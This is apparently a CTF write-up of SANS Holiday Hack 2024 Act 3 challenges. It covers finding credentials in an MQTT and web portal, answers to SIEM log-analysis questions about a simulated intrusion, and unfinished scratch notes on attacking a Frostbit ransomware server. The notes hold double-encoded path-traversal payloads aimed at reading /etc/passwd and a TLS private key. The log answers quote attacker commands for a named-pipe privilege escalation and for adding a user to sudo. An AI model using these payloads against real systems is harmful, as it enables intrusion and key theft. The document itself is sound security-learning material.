# Act 3
## Santa Vision
**Location:** The Front Yard (Act 3)
**NPC:** Ribb Bonbowford

*Alabaster and Wombley have taken over the "Santa Vision" feeds. We are tasked with knocking them out to restore the regularly scheduled programming from Santa. This challenge has 4 parts (A, B, C, D). Each of these parts has a silver and gold answer. This means we will need to find two answers for each question. The gold one will likely be harder to find than silver.*

This whole challenge operates through the GateXOR infrastructure which can be accessed by clicking on the Santa Vision terminal beside Ribb Bonbowford. To spin up the infrastructure, click the alligator icon in the bottom right corner of the screen to go to the terminal page, and then click `Time Travel`. This will spin up the infrastructure and eventually give us an IP address that represents the instance we will interface with. These instances has a time to live (TTL) of about 2 hours, meaning 2 hours after you spin them up they will stop themselves and you will have to create a new instance to continue if you are not done. If you do finish with the challenge or want to reset your instance, you can click the `Collapse` button to destroy the instance and start over. Once the instance is set up, it should look like this (note: your IP address will likely be different than mine):

![GateXOR](../images/santa_vision/gatexor.png)

### Nmap
Whenever I am given an IP address to interface with, I always like to scan it with nmap or masscan to figure out what ports are open. Since we are only scanning one IP address, I will use nmap and tell it to scan all ports.

```
nmap -p- <IP ADDRESS HERE>
```

Note: This could take around 20 minutes to complete.

Result:
![nmap scan](../images/santa_vision/nmap_scan.png)

A couple interesting ports are showing here. 1883 is the mqtt port which we were hinted about, 8000 is shown as an http port, and 9001 is sometimes used alongside MQTT for websockets to send information.
### Silver
#### Santa Vision - A
Question: *What username logs you into the SantaVision portal?*

From our nmap scan above, we see that HTTP is over port 8000. Lets visit the server on port 8000 to check whats there.

URL: `<YOUR INSTANCE IP ADDRESS>:8000`

![Web Interface](../images/santa_vision/web_interface.png)

Great. We found the web UI. Now, we need to try and log in somehow. Let's take a look at the source code (Control+U). Right on the front page, look what we find.

![Credentials found](../images/santa_vision/found_creds.png)

Creds: `mqtt: elfanon:elfanon`
Topic: `sitestatus`

If we try these creds to log in to the web UI, they work! Thats our silver answer for part A.

Part A Silver Answer: `elfanon`
#### Santa Vision - B
Question: *Once logged on, authenticate further without using Wombley's or Alabaster's accounts to see the `northpolefeeds` on the monitors. What username worked here?*

After lots of looking around for complex solutions to this problem, it dawned on me that the answer may be right in front of me. Once you're logged into the Santa Vision web UI with `elfanon:elfanon`, you can click two buttons at the bottom of the screen; `List Available Clients` and `List Available Roles`.

Available Clients: `'elfmonitor', 'WomblyC', 'AlabasterS'`
Available Roles: `'SiteDefaultPasswordRole', 'SiteElfMonitorRole', 'SiteAlabsterSAdminRole', 'SiteWomblyCAdminRole'`

Since we are specifically asked to not use Wombley or Alabasters account, we must be looking for the `elfmonitor` account. For the password, it was as simple as using `SiteElfMonitorRole`. I discounted this possibility for a while assuming it wasn't even a password. Lesson learned to just try things!

Credentials: `elfmonitor:SiteElfMonitorRole`

Now we can use these credentials to turn on the monitors and watch the northpolefeeds with the following inputs:

Connect As: `elfmonitor`
Password: `SiteElfMonitorRole`
Camera Feed Server: `YOUR SERVER IP ADDRESS`
Camera Feed Port: `9001`

You must input that information, turn on the monitors and then set the broadcast feed to `northpolefeeds` and click "Connect to broadcast feed".

![Monitors](../images/santa_vision/monitors.png)

Awesome, now we have our part B answer for silver!

Answer: `elfmonitor` (Silver)
#### Santa Vision - C
Question: *Using the information available to you in the SantaVision platform, subscribe to the `frostbitfeed` MQTT topic. Are there any other feeds available? What is the code name for the elves' secret operation?*

If we try and subscribe to the `frostbitfeed` MQTT topic with our newly found `elfmonitor` creds it with authenticate us successfully. If we wait for a while, we come across two interesting messages.

*Note: There are many MQTT clients available, but I used MQTT-Explorer for this challenge.*

Message 1:
`Let's Encrypt cert for api.frostbit.app verified. at path /etc/nginx/certs/api.frostbit.app.key`

Message 2:
`Additional messages available in santafeed`

The first message may come in handy later, but for now let's try and subscribe to `santafeed`. The same credentials will work, and if we wait again we will find the following interesting messages.

Message 1:
`Error msg: Unauthorized access attempt. /api/v1/frostbitadmin/bot/<botuuid>/deactivate, authHeader: X-API-Key, status: Invalid Key, alert: Warning, recipient: Wombley`

Message 2:
`Sixteen elves launched operation: Idemcerybu`

Again, the first message may come in handy later, but the second message is exactly what we're looking for. The code name for the elves' secret operation!

Answer (Silver): `Idemcerybu`
#### Santa Vision - D
Question: *There are too many admins. Demote Wombley and Alabaster with a single MQTT message to correct the `northpolefeeds` feed. What type of contraption do you see Santa on?*

 If we watch the `santafeed` topic for long enough (elfmonitor creds), we see the following message; `singleAdminMode=false`. The objective of this part of the challenge talks about how there are too many admins. Maybe to demote Wombley and Alabaster, all we need to do is set `singleAdminMode=true` and Santa will regain control as the single admin. Lets try it out. Subscribe to the `santafeed` topic and send the following message `singleAdminMode=true`. Now take a look at the `northpolefeeds` on the monitors.

![Santas Pogostick](../images/santa_vision/santa_pogo_stick.png)

Santa is on a pogo stick! Well done! That's our answer for silver part D!

Answer (Silver): `pogo stick`
### Gold
#### Santa Vision - A
Question: *What username logs you into the SantaVision portal?

Let's try and connect to the `sitestatus` MQTT topic we found in part A and see what we can find. Remember, we found the MQTT port on 1833 from our nmap scan earlier.

Connect to the `sitestatus` topic on your server (port 1883) using the elfanon credentials we found. Once connected, we see a stream of messages coming through the `sitestatus` topic. After watching for a while, one message stands out.

```
File downloaded: /static/sv-application-2024-SuperTopSecret-9265193/applicationDefault.bin
```

If we add this to the webserver URL, we can download the file `applicationDefault.bin`.

URL:
`http://<server_ip>:8000/static/sv-application-2024-SuperTopSecret-9265193/applicationDefault.bin`

Now let's check the type of this file with the `file` command
```
file applicationDefault.bin
```

Result: `applicationDefault.bin: Linux jffs2 filesystem data little endian`

One of the hints we got for this challenge was the following:
[jefferson](https://github.com/onekey-sec/jefferson/) is great for analyzing JFFS2 file systems.

Let's download jefferson and try it out. Follow the instructions on the jefferson github to install it. Once we have it installed, we can extract the filesystem with the following command.

```
jefferson applicationDefault.bin -d outdir
```

Now inside the `outdir` directory, we can browse through all the files to see if there's anything interesting. After looking for a while, I came across the following credentials in the `app/src/accounts/views.py` file.

```
@accounts_bp.route("/sv2024DB-Santa/SantasTopSecretDB-2024-Z.sqlite", methods=["GET"])
```

Let's try and download this database the same way as we did with `applicationDefault.bin`.

URL:
`http://<server_ip>:8000/sv2024DB-Santa/SantasTopSecretDB-2024-Z.sqlite`

It worked! Let's see if we can open it. Use the sqlite3 command to enter the sqlite shell and then open the database and list its tables.

![Sqlite creds](../images/santa_vision/sqlite_creds.png)

Turns out there is a `users` table in the sqlite database and upon querying it we found the following credentials:

Username: `santaSiteAdmin`
Password: `S4n+4sr3411yC00Lp455wd`

If we try and use this to log into the Santa Vision portal, it works!

Answer (Gold): `santaSiteAdmin`
#### Santa Vision - B
Question: *Once logged on, authenticate further without using Wombley's or Alabaster's accounts to see the `northpolefeeds` on the monitors. What username worked here?*

One of the hints for this part was `Be on the lookout for strange HTTP headers...`
Let's use burp's proxy browser to log into Santa Vision with our newfound `santaSiteAdmin` credentials and take a look through all the request/response headers to see what we find.

Sure enough, when we log in as `santaSiteAdmin` to the web ui, one of the HTTP requests has some credentials in the HTTP header:

![HTTP Headers](../images/santa_vision/http_header_creds.png)

```
BrkrTopic: northpolefeeds
BrkrUser: santashelper2024
BrkrPswd: playerSantaHelperPass8153306128
```

Let's test and see if these credentials will help us authenticate to the monitors. They do!

*Note: The password for this user is unique to the login session of SantaSiteAdmin so it will change if you log out and log in again. Each time you do so you must check the HTTP headers and get the new password.*

Answer (Gold): `santashelper2024`
#### Santa Vision - C
Question: *Using the information available to you in the SantaVision platform, subscribe to the `frostbitfeed` MQTT topic. Are there any other feeds available? What is the code name for the elves' secret operation?

After scouring the MQTT feeds for ages, I couldn't seem to find any more clues as to what the "Gold" answer for this question could be. How could there be more than one name for a secret operation? But maybe there weren't two names, maybe the name `Idemcerybu` is just encoded? It doesn't look like base64, and if you try to decode it with base64 it produces gibberish. So what could have been used to encrypt it if we have not found any key to decrypt it? A caesar substitution cipher.

To quickly try out all possibilities, we can use CyberChef and it's ROTATE recipe (ROT13). By default it rotates the characters by 13 (example: a --> n), but we can change that value. After some trial and error the answer was found with a rotation value of 10.

![Caesar Cipher](../images/santa_vision/rotate.png)

Answer (Gold): `Snowmobile`
#### Santa Vision - D
Question: *There are too many admins. Demote Wombley and Alabaster with a single MQTT message to correct the `northpolefeeds` feed. What type of contraption do you see Santa on?

We have already done this once. There must be something we need to change to get a different output. We just found a bunch of new credentials, the `SantaSiteAdmin` to log into the web interface, and from that we got `santashelper2024` which we can use to turn on the monitors and subscribe to MQTT topics. Let's try using the `santashelper2024` user to connect to the `santafeed` and send the `singleAdminMode=true` message as we did before and see if it changes anything.

Note: When logging in with MQTT, make sure to log in with `SantaSiteAdmin` on the web UI, then get the `santashelper2024` credentials from the HTTP headers in burp which you can use for MQTT. You may also want to use them to log into the monitor feed on the web UI to watch the `northpolefeed` for changes.

Once we are logged in on MQTT-Explorer, send the `singleAdminMode=true` to the santafeed. Watch the monitors next to see what happens.

![Santas Hovercraft](../images/santa_vision/santa_hovercraft.png)

It worked! Santa is riding on a hovercraft!

Answer (Gold): `Hovercraft`
### Extra
I found some extra credentials in the jefferson filesystem at `app/src/core/views.py` that didn't seem to come into play. 

```
auth={'username':"SantaBrokerAdmin", 'password':"8r0k3R4d1mp455wD"}
```

Considering that these credentials have the word "Broker" and "Admin" in them, I assume they are for interacting with MQTT as an admin. I tried using them to send the `singleAdminMode=true` message but they didn't work.

---
### Elf Stack
**Location:** The Front Yard (Act 3)
**NPC:** Fitzy Shortstack

*Help the ElfSOC analysts track down a malicious attack against the North Pole domain.*

*Note: This challenge uses some docker compose infrastructure. To get it up and running, make sure you first run `docker compose up setup`, then once that is done run `docker compose up`. Once that is done, go to `localhost:5601` and login using the following credentials; `elastic:ELFstackLogin!`. Once logged in, go to the "Discover" tab and set the date range for the logs to `Jan 1, 2024 -> Dec 31, 2024`.*
#### Easy Mode
##### Question 1
Q: *How many unique values are there for the event_source field in all logs?*
A: `5`

Explanation:
Click `event_source` in the left hand tab and click visualize. In the menu to the right of the graph, put unique count of event_source on y axis and remove the x axis. Hover over the graph to see the count.

![Unique event source count](../images/elf_stack/easy_mode/q1_graph.png)
##### Question 2
Q: *Which event_source has the fewest number of events related to it?*
A: `AuthLog`

Explanation:
Using the same method as question 1, put event_source on the x axis and the count of events on the y axis.

![Question 2 graph](../images/elf_stack/easy_mode/q2_graph.png)
##### Question 3:
Q: *Using the event_source from the previous question as a filter, what is the field name that contains the name of the system the log event originated from?*
A: `hostname`
KQL Query:
```
event_source : "AuthLog" 
```

After running this query, open one of the logs and look through all the fields. You will find the `hostname` field.
##### Question 4:
Q: *Which event_source has the second highest number of events related to it?*
A: `NetflowPmacct`

Explanation:
We can look at the same graph from question 2.
##### Question 5:
Q: *Using the event_source from the previous question as a filter, what is the name of the field that defines the destination port of the Netflow logs?*
A: `port_dst`
KQL Query:
```
event_source : "NetflowPmacct" 
```

After running this query, open one of the logs and look through all the fields. You will find the `port_dst` field.
##### Question 6:
Q: *Which event_source is related to email traffic?*
A: `SnowGlowMailPxy`

Explanation:
The name of the event source makes it obvious, but if you look through logs of that event source you will see all the email related data such as email addresses and email content.
##### Question 7:
Q: *Looking at the event source from the last question, what is the name of the field that contains the actual email text?*
A: `Body`
KQL Query:
```
event_source : "SnowGlowMailPxy"
```

After running this query, open one of the logs and look through all the fields. You will find the `Body` field with email text in it.
##### Question 8:
Q: *Using the 'GreenCoat' event_source, what is the only value in the hostname field?*
A: `SecureElfGwy`
KQL Query:
```
event_source : "GreenCoat"
```

After running this query, look through the logs. You will find the `hostname` field is the same for all of them. 
##### Question 9:
Q: *Using the 'GreenCoat' event_source, what is the name of the field that contains the site visited by a client in the network?*
A: `url`
KQL Query:
```
event_source : "GreenCoat"
```

After running this query, open one of the logs and look through all the fields. You will find the `url` field with the site url in it.
##### Question 10:
Q: *Using the 'GreenCoat' event_source, which unique URL and port (URL:port) did clients in the TinselStream network visit most?*
A: `pagead2.googlesyndication.com:443`

Explanation:
Using the same method as question 2, search for the `url` field on the left pane and visualize it. In the x axis, put the top 5 values of `event.url`. In the y axis, put `Count of records`. The above url comes out ahead with 150 records.
##### Question 11:
Q: *Using the 'WindowsEvent' event_source, how many unique Channels is the SIEM receiving Windows event logs from?*
A: `5`

Explanation:
Visualize `event.Channel` and set the y axis as unique count of `event.Channel` and remove the x axis.
##### Question 12:
Q: *What is the name of the event.Channel (or Channel) with the second highest number of events?*
A: `Microsoft-Windows-Sysmon/Operational`

Explanation:
Visualize `event.Channel` and set the x axis to the top 5 values of `event.Channel` and set the y axis to `Count of records`. The second highest count is `Microsoft-Windows-Sysmon/Operational` with 17,709 records.
##### Question 13:
Q: *Our environment is using Sysmon to track many different events on Windows systems. What is the Sysmon Event ID related to loading of a driver?*
A: `6`

Explanation:
After searching for a long time, I immediately found the answer with a search on duckduckgo.
##### Question 14:
Q: *What is the Windows event ID that is recorded when a new service is installed on a system?*
A: `4697`

Explanation:
Duckduckgo strikes again...
##### Question 15:
Q: *Using the WindowsEvent event_source as your initial filter, how many user accounts were created?*
A: `0`

Explanation:
I'm pretty sure the relevant event id for this event would be 4720, but doing a search for that we don't see anything so...zero it is!
#### Hard Mode
##### Question 1:
Q: *What is the event.EventID number for Sysmon event logs relating to process creation?*
A: `1`

Explanation:
Duckduckgo again!
##### Question 2:
Q: *How many unique values are there for the 'event_source' field in all of the logs?*
A: `5`

Explanation:
Same answer as easy mode.
##### Question 3:
Q: *What is the event_source name that contains the email logs?*
A: `SnowGlowMailPxy`

Explanation:
Same answer as easy mode.
##### Question 4:
Q: *The North Pole network was compromised recently through a sophisticated phishing attack sent to one of our elves. The attacker found a way to bypass the middleware that prevented phishing emails from getting to North Pole elves. As a result, one of the Received IPs will likely be different from what most email logs contain. Find the email log in question and submit the value in the event 'From:' field for this email log event.*
A: `kriskring1e@northpole.local`
KQL Query:
```
event_source : "SnowGlowMailPxy"
```

Explanation:
Click on the `ReceivedIP2` field in the left pane. The following visualization should show.
![ip visualization](../images/elf_stack/hard_mode/receivedip2.png)
Now send the following KQL query to get the email in question.

```
event_source : "SnowGlowMailPxy" and event.ReceivedIP2 : "34.30.110.62"
```

Only one event is shown, with the `From` field set to `kriskring1e@northpole.local`.
##### Question 5:
Q: *Our ElfSOC analysts need your help identifying the hostname of the domain computer that established a connection to the attacker after receiving the phishing email from the previous question. You can take a look at our GreenCoat proxy logs as an event source. Since it is a domain computer, we only need the hostname, not the fully qualified domain name (FQDN) of the system.*
A: `SleighRider`

Looking at the email log from question 4, we see the following email body
```
We need to store the updated naughty and nice list somewhere secure. I posted it here http://hollyhaven.snowflake/howtosavexmas.zip. Act quickly so I can remove the link from the internet! I encrypted it with the password: n&nli$t_finAl1 thx! kris - Sent from the sleigh. Please excuse any Ho Ho Ho's.
```
So we should look for any logs that reach out to that domain
```
event_source : "GreenCoat" and event.url : "http://hollyhaven.snowflake/howtosavexmas.zip"
```

Only one result shows up with the following:
`event.host: SleighRider`
##### Question 6:
Q: *What was the IP address of the system you found in the previous question?*
A: `172.24.25.12`

Explanation:
Found in the same log as above (event.ip).
##### Question 7:
Q: *A process was launched when the user executed the program AFTER they downloaded it. What was that Process ID number (digits only please)?*
A: `10014`
KQL Query:
```
event_source : "WindowsEvent" and event.EventID : 1 and event.CommandLine : *howtosavexmas.zip*
```

Explanation:
Only one log is found. Look at the value for event.ProcessID.
##### Question 8:
Q: *Did the attacker's payload make an outbound network connection? Our ElfSOC analysts need your help identifying the destination TCP port of this connection.*
A: `8443`
KQL Query:
```
event_source : "WindowsEvent" and event.ProcessID : "10014" and event.Category : "Network connection detected (rule: NetworkConnect)" and event.Image : *howtosavexmas*
```

Explanation:
Use the process id value we found in question 7. Only one log is returned and the `event.DestinationPort` is 8443.
##### Question 9:
Q: *The attacker escalated their privileges to the SYSTEM account by creating an inter-process communication (IPC) channel. Submit the alpha-numeric name for the IPC channel used by the attacker.*
A: `ddpvccdbr`
KQL Query:
```
event_source : "WindowsEvent" and event.ProcessID : "10014" and event.CommandLine: *pipe*
```

Explanation:
I did some research on what methods are used for inter process communication on windows and came across the following [webpage](https://stackoverflow.com/questions/2721762/what-are-windows-ipc-methods). It seems named pipes are the most easy/common method for IPC so I decided to include the word "pipe" in my query. Sometimes thats what it takes...

Offending command:
```
cmd.exe /c echo ddpvccdbr &gt; \\.\pipe\ddpvccdbr
```
##### Question 10:
Q: *The attacker's process attempted to access a file. Submit the full and complete file path accessed by the attacker's process.*
A: `C:\Users\elf_user02\Desktop\kkringl315@10.12.25.24.pem`
KQL Query:
```
event_source : "WindowsEvent" and event.EventID: "4663" and event.ProcessID : "10014"
```

Explanation:
4663 is the windows EventID for file access ("Attempt was made to access an object"). Using that event id and the process ID, there was only one log returned.
##### Question 11:
Q: *The attacker attempted to use a secure protocol to connect to a remote system. What is the hostname of the target server?*
A: `kringleSSleigH`

Explanation:
After no luck with KQL, I did a grep in the logs for the ip from the previous question (`10.12.25.24`) and found a bunch of logs for this SSH server with logs of allowing connections to it.

![SSH Connection](../images/elf_stack/hard_mode/grep_ssh.png)
##### Question 12:
Q: *The attacker created an account to establish their persistence on the Linux host. What is the name of the new account created by the attacker?*
A: `ssdh`
KQL Query:
```
event_source : "AuthLog" and event.message: *new*
```

Explanation:
After the above KQL query, there were 5 logs returned. One of them had the following in its `event.message` field; `new user: name=ssdh, UID=1002, GID=1002, home=/home/ssdh, shell=/bin/bash, from=/dev/pts/6`.
##### Question 13:
Q: *The attacker wanted to maintain persistence on the Linux host they gained access to and executed multiple binaries to achieve their goal. What was the full CLI syntax of the binary the attacker executed after they created the new user account?*
A: `/usr/sbin/usermod -a -G sudo ssdh`
KQL Query:
```
event_source : "AuthLog" and event.message *ssdh*
```

Explanation:
11 events were returned from the query, one of them showed this command being run where they are giving their new user sudo privileges.
##### Question 14:
Q: *The attacker enumerated Active Directory using a well known tool to map our Active Directory domain over LDAP. Submit the full ISO8601 compliant timestamp when the first request of the data collection attack sequence was initially recorded against the domain controller.*
A: `2024-09-16T11:10:12-04:00`
KQL Query:
```
event_source : "WindowsEvent" and event.EventID: "2889"
```

Explanation:
I did some research and found that event ID 2289 represents an LDAP bind. Most Active Directory mapping tools will need to use bind's so this is a good starting point. Sort all the events and take the first one. The ISO8601 compliant timestamp is available in the `event.Date` field.
##### Question 15:
Q: *The attacker attempted to perform an ADCS ESC1 attack, but certificate services denied their certificate request. Submit the name of the software responsible for preventing this initial attack.*
A: `KringleGuard`
KQL Query:
```
event_source : "WindowsEvent" and event.EventID: "4888"
```

Explanation:
Through some research I found the following [webpage]( https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4886) showing the event ids related to certificate requests. The event id 4888 represents a denied certificate. In an ADCS ESC1 attack, it's likely that this event will trigger at least once. The query returned only one log and the answer can be seen in the `event.ReasonForRejection` field; `KringleGuard EDR flagged the certificate request.`
##### Question 16:
Q: *We think the attacker successfully performed an ADCS ESC1 attack. Can you find the name of the user they successfully requested a certificate on behalf of?*
A: `nutcrakr`
KQL Query:
```
event_source : "WindowsEvent" and event.EventID: "4886"
```

Explanation:
Event ID 4866 is the result of a successful certificate request. [Source](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4886). The query returns only one log. We can see the answer in the `event.UserInformation_UPN` field.
##### Question 17:
Q: *One of our file shares was accessed by the attacker using the elevated user account (from the ADCS attack). Submit the folder name of the share they accessed.*
A: `WishLists`
KQL Query:
```
event_source : "WindowsEvent" and event.EventID: "5140" and event.SubjectUserName: "nutcrakr"
```

Explanation:
[This webpage](https://docs.logrhythm.com/devices/docs/evid-5140-5144-network-share-was-accessed-security) shows that the event id for when a network share is accessed is 5140. There were 7 different logs shown with this query with different network shares, but the most unique was `WishLists`.
##### Question 18:
Q: *The naughty attacker continued to use their privileged account to execute a PowerShell script to gain domain administrative privileges. What is the password for the account the attacker used in their attack payload?*
A: `fR0s3nF1@k3_s`

Explanation:
After tons of searching with no luck I decided to just grep for `nutcrakr` and manually search after that and it was at the bottom of the grep response for `log_chunk_2.log`.

```
"ScriptBlockText": "Add-Type -AssemblyName System.DirectoryServices\n$ldapConnString = \"LDAP://CN=Domain Admins,CN=Users,DC=northpole,DC=local\"\n$username = \"nutcrakr\"\n$pswd = 'fR0s3nF1@k3_s'\n$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'\n$propGUID = [guid]'00000000-0000-0000-0000-000000000000'\n$IdentityReference = (New-Object System.Security.Principal.NTAccount(\"northpole.local\\$username\"
```
##### Question 19:
Q: *The attacker then used remote desktop to remotely access one of our domain computers. What is the full ISO8601 compliant UTC EventTime when they established this connection?*
A: `2024-09-16T15:35:57.000Z`
KQL Query: 
```
event_source :"WindowsEvent" and event.EventID: 4624 and event.TargetUserName : *nutcrakr* and event.WorkstationName: DC01
```

Explanation:
[This webpage](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4624) shows that the event ID for a successful logon is 4624. This combined with the target username of `nutcrakr` and destination workstation of the domain controller `DC01` (found from other logs) returned 2 logs. Looking into the details of these logs, there is a field called `event.LogonType`. Based on [this webpage](https://www.manageengine.com/products/active-directory-audit/learn/what-are-logon-types.html) the logon type of 10 is for logins through RDP connections. Only one of the found logs meets this criteria. We have our answer.
##### Question 20:
Q: *The attacker is trying to create their own naughty and nice list! What is the full file path they created using their remote desktop connection?*
A: `C:\WishLists\santadms_only\its_my_fakelst.txt`

Explanation:
Using grep I searched for look the 'WishLists' share from before as well as the 'nutcrakr' user. Eventually I found the following:
```
\"C:\\Windows\\system32\\NOTEPAD.EXE\" C:\\WishLists\\santadms_only\\its_my_fakelst.txt
```
##### Question 21:
Q: *The Wombley faction has user accounts in our environment. How many unique Wombley faction users sent an email message within the domain?*
A: `4`
KQL Query:
```
event_source : "SnowGlowMailPxy" and event.From: *wcub*
```

Explanation:
I assumed the Wombley faction would use an email with at least the string "wcub" in it somewhere. From there click on the `event.From` field in the left bar to visualize it. Remove the x axis and set y axis to unique count of `event.From`. This shows 4 unique email addresses.
##### Question 22:
Q: *The Alabaster faction also has some user accounts in our environment. How many emails were sent by the Alabaster users to the Wombley faction users?*
A: `22`
KQL Query:
```
event_source : "SnowGlowMailPxy" and event.From: asnowball* and event.To : wcub*
```

The total count of events is 22.
##### Question 23:
Q: *Of all the reindeer, there are only nine. What's the full domain for the one whose nose does glow and shine? To help you narrow your search, search the events in the 'SnowGlowMailPxy' event source.*
A: `rud01ph.glow`
KQL Query:
```
event_source : "SnowGlowMailPxy" and event.From: *rud*
```

Explanation:
The reindeer whose nose glows and shines is rudolph. I did a search for `*rud*` and managed to find a bunch of logs. You can see the email domain in the `event.From` field in any of the returned logs.
##### Question 24:
Q: *With a fiery tail seen once in great years, what's the domain for the reindeer who flies without fears? To help you narrow your search, search the events in the 'SnowGlowMailPxy' event source.*
A: `c0m3t.halleys`
KQL Query:
```
event_source : "SnowGlowMailPxy" and event.From: *c0m*
```

Explanation:
The reindeer "with a fiery tail" must be referring to Comet, who is named after the celestial comet which creates a tail of fire when it streaks across the sky. I tried a search for `*com*` in the `event.From` field but when that didn't return anything I assumed a possible character switch from o to 0. The email domain can be seen in the `event.From` field in any of the returned logs.
### Decrypt the Naughty-Nice List
**Location:** The Front Yard (Act 3)
**NPC:** Tangle Coalbox

*Decrypt the Frostbit-encrypted Naughty-Nice list and submit the first and last name of the child at number 440 in the Naughty-Nice list.*

Upon opening the challenge window, we are greeted with a message telling us that the Naughty-Nice list has been encrypted by the Frostbit ransomware. We are also told that the North Pole Cyber Security Department collected some artifacts from the compromised computer which we can download to inspect. Click the button to start the download (it can take a while).

![Generate artifacts](../images/frostbit_decrypt/generate.png)

Once the artifacts are downloaded, we can unzip the archive and inspect them. It seems we have a binary file, a core dump of the infected machine, a pcap file and the encrypted naughty nice list.

One of the hints for this challenge mentions that we can use tools like `strings` to find secrets in memory (core dump). Let's use strings on the core dump file and see what we can find.

```
strings frostbit_core_dump.13 | less
```

Inside, the following TLS secrets are logged. This could be useful for the pcap file we have.

```
CLIENT_HANDSHAKE_TRAFFIC_SECRET 3b1d770422e0614742407fc95c3a3c1151832242c5386fdc693367d09bca2e9d d11bd2a38666f099f412dd82ac4f6d524195c4060110405c3379bbe590bfdcd8
SERVER_HANDSHAKE_TRAFFIC_SECRET 3b1d770422e0614742407fc95c3a3c1151832242c5386fdc693367d09bca2e9d ee4e74596e54cde50ad765dd60a5d548b7a2e0db5e83024227d7a8572cef59f9
CLIENT_TRAFFIC_SECRET_0 3b1d770422e0614742407fc95c3a3c1151832242c5386fdc693367d09bca2e9d a63e8ba98c8c6cab350826907e2b4cd773030e27f323b6b5829db82010c27b9c
SERVER_TRAFFIC_SECRET_0 3b1d770422e0614742407fc95c3a3c1151832242c5386fdc693367d09bca2e9d 84d395a4a54fe2a4abdad0a4c95992710286471636aec46dcc190319e9b3b863
```

Let's open up the pcap with wireshark and see what traffic we can inspect.

---

Run strings on core dump, find TLS keys, make .log file to import into wireshark. Can now read encrypted TLS data in wireshark.
https://blog.didierstevens.com/2020/12/14/decrypting-tls-streams-with-wireshark-part-1/

{"nonce":"7455047a01ea7c1a"}

Found this link in core dump strings
https://api.frostbit.app/view/CxHT7yuDY/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/status?digest=0000440d0a9e760804015c0108202829

Found some endpoints

https://api.frostbit.app/api/v1/bot/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/session (GET)

https://api.frostbit.app/api/v1/bot/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/key (POST)
{"encryptedkey":"434cf52ed799bf94da53382f00c52101e0b694abf51e1de31c78d193ab3d492050985e9bf53c42f95c68014441a3f9649feefcebf0d6fb8ef7bec3af31cb69ccb2de9bcb2de0d843f0687c20b46c0fd1a42a92d5f99037915124cce81035f2004c0bf74a3c74ae13b2712fef4b3428fb071b8a047234cc04c14a8820c0f975b142616c5bb96644c3e653c8034c6263ff15e6547f906fbd12eae9abd9fa8d47bc411b7bf1f7f08023a869e05015037f67933d6a4b65e37806e0cf1842aa2144b1f18a5b4ddaf82b044c9330fed92fd0620aed432b42de5e88d87068d2a922d71a4fe6a290445af45f7833fa445bfa6d0dcc997b158f0956f62592e10ca153f1bc2d4ed11396349379050411e17310cfca91871cb8f3a81e8f179ee51a7052276752bcda50ce82f6ff0901cc159044b24d1e7944541dd37a09ad143b1c87a144baace24496373fc996b9ca7544212612d488cb039c67514eaa38c07c4570276371362a02bd3a70a8d44ac07da2044c4db29384a3b9e183d506e3eaffbd940e27431e194221bee8c88da35a3ff9174d72c40b6271d7554804726a6a0c20d5119ce463dd32282c36bd924466ac2af6999a0a8751019fb3a75fbcfd72e07ef572a36ac4847336225f5df83fd2958ab904f3de22c6c0e74c3ce9963e928cc3e1172e2be5ac23386f0731d7ec01b5aff49da9b77e7ba10bc5102f955936e61aec639a79","nonce":""}

Found this url with debug set and we get some small extra info at the bottom
https://api.frostbit.app/view/CxHT7yuDY/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/status?digest=0000440d0a9e760804015c0108202829&debug=true

Found this error from messing with digest in url
https://api.frostbit.app/view/CxHT7yuDY/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/status?digest=0000440d0a9e760804015c01082202829&debug=true

{"debug":true,"error":"Status Id File Digest Validation Error: Traceback (most recent call last):\n  File \"/app/frostbit/ransomware/static/FrostBiteHashlib.py\", line 55, in validate\n    decoded_bytes = binascii.unhexlify(hex_string)\nbinascii.Error: Odd-length string\n"}

Found the file at this url
https://api.frostbit.app/static/FrostBiteHashlib.py

From santa vision we know the file /etc/nginx/certs/api.frostbit.app.key exists

I think if we urlencode the url we can use url paths to get the key file
https://api.frostbit.app/view/..%2F..%2F..%2F..%2F..%2F..%2Fetc/nginx/certs/api.frostbit.app.key/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/status?digest=0000440d0a9e760804015c0108202829&debug=true

/../../../../etc/nginx/certs/api.frostbit.app.key
%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fnginx%2Fcerts%2Fapi%2Efrostbit%2Eapp%2Ekey
%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fnginx%252Fcerts%252Fapi%252Efrostbit%252Eapp%252Ekey

Filename (nonce x2): 7455047a01ea7c1a7455047a01ea7c1a
LFI: %2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fnginx%2Fcerts%2Fapi%2Efrostbit%2Eapp%2Ekey
LFI (double encoded): %252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fnginx%252Fcerts%252Fapi%252Efrostbit%252Eapp%252Ekey
Digest: 00000000000000000000000000000000
URL: https://api.frostbit.app/view/7455047a01ea7c1a7455047a01ea7c1a%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fnginx%252Fcerts%252Fapi%252Efrostbit%252Eapp%252Ekey/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/status?digest=00000000000000000000000000000000&debug=true

TEST FILE:
%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
https://api.frostbit.app/view/7455047a01ea7c1a7455047a01ea7c1a%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/status?digest=00000000000000000000000000000000&debug=true

Need to url encode filename byte array
%2574%2555%2504%257a%2501%25ea%257c%251a%2574%2555%2504%257a%2501%25ea%257c%251a

StatusID:
7455047a01ea7c1a7455047a01ea7c1a
